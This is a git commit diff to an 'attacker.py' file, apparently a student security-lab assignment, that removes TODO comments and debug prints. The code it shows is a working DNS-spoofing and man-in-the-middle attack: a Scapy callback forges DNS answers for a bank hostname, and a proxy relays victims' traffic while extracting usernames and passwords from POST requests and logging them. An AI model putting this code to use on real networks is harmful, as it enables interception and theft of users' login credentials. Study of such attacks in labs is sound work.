b5a45056e7096abc69f8dd9da98ad098d7cef4cd
whysoserious <abed.sari4@gmail.com>
2021-12-27 13:13:39 +0200

    remove comments and TODOs

--- attacker/attacker.py
+++ attacker/attacker.py
@@ -22,9 +22,8 @@ def log_credentials(username, password):
 
 
 def check_credentials(client_data):
-	# TODO: Take a block of client data and search for username/password credentials.
+	# Take a block of client data and search for username/password credentials.
 	# If found, log the credentials to the system by calling log_credentials().
-	#raise NotImplementedError
 	strd = str(client_data)
 	client_data_list = strd.split("'")
 	username = client_data_list[1]
@@ -37,27 +36,20 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
 	# and initiate a connection with the host in order to forward data
 
 	while True:
-		# TODO: accept a new connection from the client on client_socket and
+		# accept a new connection from the client on client_socket and
 		# create a new socket to connect to the actual host associated with hostname.
-		# TODO: read data from client socket, check for credentials, and forward along to host socket.
+		# read data from client socket, check for credentials, and forward along to host socket.
 		# Check for POST to '/post_logout' and exit after that request has completed.
-	
-		print("here1")
-		#client_socket.listen(5)
-		print("here2")
+
 		conn, address = client_socket.accept()
-		print("Conn: " + str(conn))
-		print("Address: " + str(address))
 		bank_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		bank_socket.bind((client_socket.getsockname()[0],0))
 		bank_socket.connect((resolve_hostname(HOSTNAME), WEB_PORT))
 		
 		data = conn.recv(8*1024)
 		data_string = str(data)
-		print("Data: " + str(data))
 		
 		if "POST" in data_string and "username" in data_string and "password" in data_string:
-			print("found credentials")
 			check_credentials(data)
 		if "POST" in data_string and "/post_logout" in data_string:
 			exit(0)
@@ -70,17 +62,9 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
 
 
 def dns_callback(packet, extra_args):
-	# TODO: Write callback function for handling DNS packets.
+	# Write callback function for handling DNS packets.
 	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
 	if DNS in packet and packet[DNS].qr == 0:
-		#print("DNS packet: " + packet.summary())
-		#print("Source IP: " + packet[IP].src)
-		#print("Dest IP: " + packet[IP].dst)
-		#print("Source Port: " + str(packet[UDP].sport))
-		#print("Dest Port: " + str(packet[UDP].dport))
-		#print("QR flag: " + str(packet[DNS].qr))
-		#print("Requested website: " + str(packet.qd.qname))
-		#print()
 		dnsrr = DNSRR(rdata=extra_args[0], rrname=HOSTNAME, ttl=5)
 		response_dns = DNS(id=packet[DNS].id, qd=packet[DNS].qd, an=dnsrr, qr=1, aa=1)
 		response = IP(src=packet[IP].dst, dst=packet[IP].src, ttl=5)/UDP(sport=53, dport=packet[UDP].sport)/DNS()
@@ -92,14 +76,14 @@ def dns_callback(packet, extra_args):
 
 
 def sniff_and_spoof(source_ip):
-	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
+	# Open a socket and bind it to the attacker's IP and WEB_PORT.
 	# This socket will be used to accept connections from victimized clients.
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.bind((source_ip, WEB_PORT))
 	s.listen(5)
 
 
-	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
+	# sniff for DNS packets on the network. Make sure to pass source_ip
 	# and the socket you created as extra callback arguments.
 	sniff(iface="lo", prn=lambda p: dns_callback(p, (source_ip, s)))
 
